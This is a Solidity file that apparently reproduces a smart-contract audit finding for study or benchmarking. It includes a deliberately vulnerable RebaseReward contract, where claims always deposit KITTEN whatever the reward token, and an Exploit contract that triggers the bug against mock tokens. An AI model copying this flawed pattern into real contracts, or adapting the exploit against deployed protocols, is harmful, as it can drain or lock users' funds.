// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic reproduction of KittenSwap finding 58205 (C-01):
// "`RebaseReward` fails because of incorrect token handling".
//
// Source (Pashov Audit Group), RebaseReward contract. The vulnerable claim line
// is reproduced VERBATIM (marked @>):
//   veKitten.deposit_for(_tokenId, reward);
//
// Root cause: on claim, `RebaseReward` always calls `veKitten.deposit_for(...)`,
// which deposits KITTEN into the VotingEscrow — regardless of which token the
// reward was actually in. Because `incentivize()` accepts any whitelisted token,
// a non-Kitten reward is paid out as KITTEN (draining the contract's Kitten meant
// for real Kitten rewards) while the deposited non-Kitten token stays locked in
// the contract forever.
// ─────────────────────────────────────────────────────────────────────────────

interface IERC20 {
    function balanceOf(address a) external view returns (uint256);
    function approve(address s, uint256 a) external returns (bool);
    function transfer(address to, uint256 a) external returns (bool);
    function transferFrom(address f, address t, uint256 a) external returns (bool);
}

contract MiniToken is IERC20 {
    string public name; string public symbol;
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    constructor(string memory n, string memory s) { name = n; symbol = s; }
    function mint(address to, uint256 a) external { balanceOf[to] += a; }
    function approve(address s, uint256 a) external returns (bool) { allowance[msg.sender][s] = a; return true; }
    function transfer(address to, uint256 a) external returns (bool) { balanceOf[msg.sender] -= a; balanceOf[to] += a; return true; }
    function transferFrom(address f, address t, uint256 a) external returns (bool) {
        uint256 al = allowance[f][msg.sender]; require(al >= a, "allowance");
        if (al != type(uint256).max) allowance[f][msg.sender] = al - a;
        balanceOf[f] -= a; balanceOf[t] += a; return true;
    }
}

/// @dev Faithful VotingEscrow: deposit_for pulls KITTEN from the caller and credits the tokenId.
contract VotingEscrow {
    IERC20 public immutable kitten;
    mapping(uint256 => uint256) public lockedKitten; // tokenId => kitten locked
    constructor(IERC20 _kitten) { kitten = _kitten; }
    function deposit_for(uint256 _tokenId, uint256 amount) external {
        kitten.transferFrom(msg.sender, address(this), amount);
        lockedKitten[_tokenId] += amount;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — the claim's `deposit_for` line is VERBATIM.
// ─────────────────────────────────────────────────────────────────────────────
contract RebaseReward {
    VotingEscrow public immutable veKitten;
    IERC20 public immutable kitten;

    mapping(address => uint256) public rewardOf; // token => reward amount owed (simplified)
    event ClaimReward(uint256 period, uint256 tokenId, address token, address owner);

    constructor(VotingEscrow _ve, IERC20 _kitten) {
        veKitten = _ve;
        kitten = _kitten;
        kitten.approve(address(_ve), type(uint256).max); // RebaseReward funds deposit_for from its Kitten stash
    }

    /// @notice Anyone can add rewards of ANY whitelisted token here.
    function incentivize(address token, uint256 amount) external {
        IERC20(token).transferFrom(msg.sender, address(this), amount);
        rewardOf[token] += amount;
    }

    /// @notice Claim the reward for `token` on behalf of `_tokenId`.
    function getReward(uint256 _tokenId, address token, uint256 _period, address _owner) external {
        uint256 reward = rewardOf[token];
        rewardOf[token] = 0;
        if (reward > 0) {
            veKitten.deposit_for(_tokenId, reward); // @> VULN: always deposits KITTEN regardless of `token`, so a non-Kitten reward is paid out as Kitten while the real token stays locked
            emit ClaimReward(_period, _tokenId, token, _owner);
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: incentivize a token0 reward, claim it, and show the escrow
// received KITTEN (not token0) while the 100e18 token0 is locked in RebaseReward.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    uint256 internal constant AMT = 100e18;
    uint256 internal constant TOKEN_ID = 1;

    MiniToken public token0;      // child nonce 1 (locked reward token)
    MiniToken public kitten;      // child nonce 2
    VotingEscrow public ve;       // child nonce 3
    RebaseReward public vuln;     // child nonce 4 (VULN)

    uint256 public kittenWronglyDeposited;
    uint256 public token0Locked;

    constructor() {
        token0 = new MiniToken("Token0", "TK0");   // nonce 1
        kitten = new MiniToken("Kitten", "KITTEN"); // nonce 2
        ve = new VotingEscrow(IERC20(address(kitten))); // nonce 3
        vuln = new RebaseReward(ve, IERC20(address(kitten))); // nonce 4
    }

    function run() external {
        // RebaseReward holds KITTEN meant for real Kitten rewards
        kitten.mint(address(vuln), AMT);

        // anyone adds a token0 reward via incentivize()
        token0.mint(address(this), AMT);
        token0.approve(address(vuln), type(uint256).max);
        vuln.incentivize(address(token0), AMT);

        // claim the token0 reward -> escrow is credited KITTEN, token0 stays locked
        vuln.getReward(TOKEN_ID, address(token0), 1, address(this));

        kittenWronglyDeposited = ve.lockedKitten(TOKEN_ID); // KITTEN deposited for a token0 reward
        token0Locked = token0.balanceOf(address(vuln));     // token0 trapped in RebaseReward

        // harm: reward paid in the WRONG token; the real token0 is locked
        require(kittenWronglyDeposited == AMT, "kitten not wrongly deposited");
        require(token0Locked == AMT, "token0 not locked");

        // record the locked/mis-handled magnitude to SINK on token0
        token0.mint(SINK, token0Locked);
    }
}
